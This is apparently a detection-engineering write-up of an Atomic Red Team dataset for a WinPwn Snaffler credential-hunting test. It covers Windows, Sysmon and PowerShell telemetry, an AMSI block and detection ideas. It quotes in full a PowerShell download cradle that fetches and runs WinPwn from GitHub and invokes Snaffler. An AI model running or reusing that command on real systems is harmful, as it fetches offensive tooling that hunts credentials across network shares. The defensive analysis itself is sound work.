# T1552.001-8: Credentials In Files — WinPwn Snaffler

## Technique Context

T1552.001 (Credentials in Files) includes network share credential hunting as well as local file searching. WinPwn's `Snaffler` function wraps the Snaffler tool by SnaffCon — a targeted credential hunter that enumerates accessible network file shares across a domain environment, then prioritizes findings by content sensitivity. Snaffler looks for configuration files, scripts, SSH keys, password spreadsheets, database connection strings, and similar artifacts across all shares visible from the executing workstation. When run from a domain-joined host, it also performs LDAP queries to enumerate shares across the entire domain, making it considerably more powerful than local-only file searches.

Like the other WinPwn tests in this series, the tool is fetched from GitHub at runtime via a download cradle. In the defended variant, AMSI blocked WinPwn identically. In this undefended run, the same AMSI block occurred — indicating that AMSI signatures remain active independent of real-time Defender protection on this host.

## What This Dataset Contains

The dataset spans approximately fourteen seconds of telemetry (2026-03-17T17:19:48Z–17:20:02Z) across four log sources, with 136 total events. The longer time window (14 seconds vs 9 seconds for T1552.001-7) reflects a slightly longer execution lifecycle before the AMSI block resolved.

**Security EID 4688 — three process creates:**
1. `whoami.exe` (PID 0x42d4) — ART pre-check
2. Attack `powershell.exe` child (PID 0x4580):
   ```
   "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
   Snaffler -noninteractive -consoleoutput}
   ```
3. `whoami.exe` (PID 0x44e0) — post-execution check

**Sysmon EID breakdown — 19 events: 8 EID 7, 3 EID 10, 3 EID 1, 2 EID 11, 1 EID 17, 1 EID 22, 1 EID 3:**

- **EID 22 (DNS Query)**: `powershell.exe` (PID 17792) queried `raw.githubusercontent.com`, resolving to `185.199.109.133`, `185.199.110.133`, `185.199.111.133`, and `185.199.108.133` — all four CDN IPs.
- **EID 3 (Network Connection)**: Outbound TCP from `powershell.exe` (PID 17792, source `192.168.4.16:51526`) to `185.199.109.133` — the actual download connection established. The WinPwn.ps1 script was retrieved over this connection.
- **EID 1 (Process Create)**: The attack `powershell.exe` (PID 17792) is tagged `technique_id=T1059.001`. The `whoami.exe` processes carry `T1033` tags.
- **EID 10 (Process Access)**: Three events. One shows the test framework PowerShell (PID 17924) opening `whoami.exe` (PID 17108) with `GrantedAccess: 0x1FFFFF`. A second shows the same test framework process opening the attack `powershell.exe` child (PID 17792) with the same access mask. A third event is an inter-process access between two test framework instances.
- **EID 11 (File Create)**: Two file creation events — one is `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-Interactive` (a PowerShell profile initialization artifact) and one is `StartupProfileData-NonInteractive`. Both are standard PowerShell runtime files, not Snaffler output.

**PowerShell — 112 events: 109 EID 4104, 2 EID 4103, 1 EID 4100:**
The EID 4100 error records the AMSI block with the same `ScriptContainedMaliciousContent` identifier as the defended run and other WinPwn tests. The EID 4103 module log records `New-Object net.webclient` execution. The 109 EID 4104 script blocks follow the standard test framework boilerplate pattern.

**Application — 2 EID 15 events:**
Two Defender state-machine events reflecting the re-enable cycling.

## What This Dataset Does Not Contain

Snaffler's actual domain share enumeration — LDAP queries for accessible shares, remote file system traversal, and credential-bearing file identification — did not occur. AMSI blocked WinPwn before the `Snaffler` function was defined or called. No domain controller connections, no remote share access events, and no credential file findings appear in the data.

Unlike T1552.001-7, this test does not produce a MsMpEng.exe EID 11 temp file within the capture window. The absence likely reflects minor timing differences in the AMSI evaluation path rather than any substantive difference in protection behavior.

## Assessment

This dataset is structurally near-identical to T1552.001-7 (sensitivefiles) from a telemetry perspective. The network artifacts are equivalent: DNS query to `raw.githubusercontent.com`, established TCP connection to `185.199.109.133`, and AMSI blocking the script content. The primary differentiator is the specific WinPwn function name in the Security EID 4688 command line and the PowerShell EID 4104 script block — `Snaffler` rather than `sensitivefiles`. Detection rules targeting the download URL or the `iex(new-object net.webclient)` pattern will fire identically for both. Rules targeting specific function names will differentiate them. The Snaffler module is particularly significant because of its domain-wide share enumeration capability — detecting the invocation attempt before AMSI fires (via the Security 4688 command line or DNS query) is more valuable than relying solely on the AMSI block event.

## Detection Opportunities Present in This Data

1. Sysmon EID 3 (Network Connection) from `powershell.exe` to `185.199.109.133` (GitHub CDN) on port 443 — the established TCP connection to retrieve WinPwn confirms the download succeeded before AMSI evaluated it, providing an additional pre-block detection point.

2. Sysmon EID 22 + EID 3 in sequence from the same PowerShell process GUID — correlating DNS resolution with a TCP connection to the resolved address from a script interpreter confirms an active download, not just passive DNS prefetching.

3. PowerShell EID 4104 containing `Snaffler` (case-insensitive) — Snaffler is a known threat tool with no legitimate deployment use in enterprise environments.

4. Security EID 4688 command line containing `Snaffler` and `noninteractive` — the `-noninteractive` flag is characteristic of automated tool execution in post-exploitation frameworks.

5. PowerShell EID 4100 with `ScriptContainedMaliciousContent` immediately after a network connection from the same process — this sequencing confirms a download-then-block chain that AMSI successfully interrupted.

6. Sysmon EID 10 showing a parent PowerShell process opening a child PowerShell process with `GrantedAccess: 0x1FFFFF` shortly before a network connection from the child — this pattern (test framework spawning a network-active attack process and maintaining full access to it) is observable across all WinPwn tests in this series and can be used as a behavior cluster.
